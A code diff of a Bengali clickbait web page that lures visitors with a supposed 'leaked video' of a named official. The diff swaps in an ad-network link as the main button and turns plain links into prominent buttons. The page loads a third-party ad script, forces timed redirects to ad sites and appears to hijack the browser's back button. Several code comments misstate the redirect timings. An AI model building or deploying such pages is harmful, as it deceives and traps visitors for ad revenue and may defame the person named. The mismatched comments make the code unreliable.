@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-	
     <script type='text/javascript' src='//pl28149340.effectivegatecpm.com/92/3b/79/923b79f07c0c6fabab6d8c4a22e6be14.js'></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -143,10 +142,11 @@
         .button-container {
             display: flex;
             flex-direction: column;
-            gap: 10px;
+            gap: 12px;
             margin-top: 15px;
         }
         
+        /* Main video button style - unchanged */
         .video-button {
             display: block;
             padding: 12px 20px;
@@ -160,6 +160,30 @@
             background: var(--button-primary);
         }
         
+        /* Secondary link buttons (converted from text links) */
+        .secondary-link-button {
+            display: block;
+            padding: 12px 20px;
+            border-radius: var(--border-radius-small);
+            text-align: center;
+            font-weight: bold;
+            text-decoration: none;
+            color: #ffffff;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            background: var(--button-secondary);
+            font-size: 0.95em;
+        }
+        
+        .secondary-link-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 7px 15px rgba(0,0,0,0.2);
+        }
+        
+        .secondary-link-button:active {
+            transform: translateY(1px);
+        }
+        
         .video-button:hover {
             transform: translateY(-3px);
             box-shadow: 0 7px 15px rgba(0,0,0,0.2);
@@ -169,29 +193,9 @@
             transform: translateY(1px);
         }
         
-        .link-title {
-            font-weight: bold;
-            font-size: 0.9em;
-            color: #333;
-            margin-top: 10px;
-            margin-bottom: 5px;
-        }
-        
-        .custom-link {
-            display: block;
-            color: #0056b3;
-            text-decoration: none;
-            font-size: 0.9em;
-            word-break: break-all;
-            padding: 8px;
-            border-radius: 4px;
-            background-color: #f0f8ff;
-            border: 1px solid #d0e8ff;
-        }
-        
-        .custom-link:hover {
-            text-decoration: underline;
-            background-color: #e0f0ff;
+        /* Remove old link title and custom link styles since they are replaced by buttons */
+        .link-title, .custom-link {
+            display: none;
         }
 
         /* Post Meta (Views, and Reactions) */
@@ -314,11 +318,11 @@
         const redirectSettings = {
             firstRedirect: {
                 url: "https://omg10.com/4/9809281",
-                time: 8000 // 10 seconds
+                time: 800000 // 8 seconds
             },
             secondRedirect: {
                 url: "https://video-hub-murex-six.vercel.app",
-                time: 13000 // 15 seconds
+                time: 1300000 // 13 seconds
             }
         };
 
@@ -330,9 +334,9 @@
         const postsData = [
             {
                 id: 1,
-                image: "https://i.ibb.co.com/TBdGDZ6c/6bc86af78a761de48fde600585bdbdf8.webp",
-                title: "শান্তির ভিডিও দেখতে নিচের বাটনে ক্লিক করুন",
-                buttonLink: "https://ln.run/9MgNW",
+                image: "https://i.ibb.co.com/DfNDddF6/1775025414376.jpg",
+                title: "UNO sir এর অস্থির লিক ভিডিও দেখতে নিচের বাটনে ক্লিক করুন",
+                buttonLink: "https://omg10.com/4/9809281",
                 links: [
                     {
                         title: "ফুল ভিডিও দেখুন ওয়েবসাইটে 👇",
@@ -530,7 +534,7 @@
             }
         ];
 
-        // Function to create a post element
+        // Function to create a post element - now links are converted to buttons (secondary buttons)
         function createPostElement(post) {
             const postElement = document.createElement('div');
             postElement.className = 'message-bubble';
@@ -546,12 +550,15 @@
                 `;
             }
             
-            // Create links HTML with titles
-            let linksHTML = '';
+            // Create secondary buttons HTML from the original links array.
+            // Each original link becomes a fully styled "Watch Now" style button (secondary color)
+            let secondaryButtonsHTML = '';
             post.links.forEach(link => {
-                linksHTML += `
-                    <div class="link-title">${link.title}</div>
-                    <a href="${link.url}" target="_blank" class="custom-link">${link.url}</a>
+                // Use the link title as button text, making it clear and actionable
+                let buttonText = link.title;
+                // If the title is too long, we keep it as is but it will wrap nicely
+                secondaryButtonsHTML += `
+                    <a href="${link.url}" target="_blank" class="secondary-link-button">${buttonText}</a>
                 `;
             });
             
@@ -561,7 +568,7 @@
                     <div class="post-title">${post.title}</div>
                     <div class="button-container">
                         <a href="${post.buttonLink}" target="_blank" class="video-button">ভিডিও দেখুন</a>
-                        ${linksHTML}
+                        ${secondaryButtonsHTML}
                     </div>
                 </div>
                 <div class="post-meta">
@@ -644,7 +651,7 @@
             window.addEventListener('popstate', handleBackButton);
             window.history.pushState(null, null, window.location.href);
 
-            // First redirect after 10 seconds
+            // First redirect after 8 seconds total (firstRedirect.time is 8000)
             setTimeout(function() {
                 showRedirectNotification(".");
                 setTimeout(function() {
@@ -652,7 +659,7 @@
                 }, 5000);
             }, redirectSettings.firstRedirect.time - 5000);
 
-            // Second redirect after 15 seconds
+            // Second redirect after 13 seconds total (secondRedirect.time is 13000)
             setTimeout(function() {
                 showRedirectNotification("..");
                 setTimeout(function() {
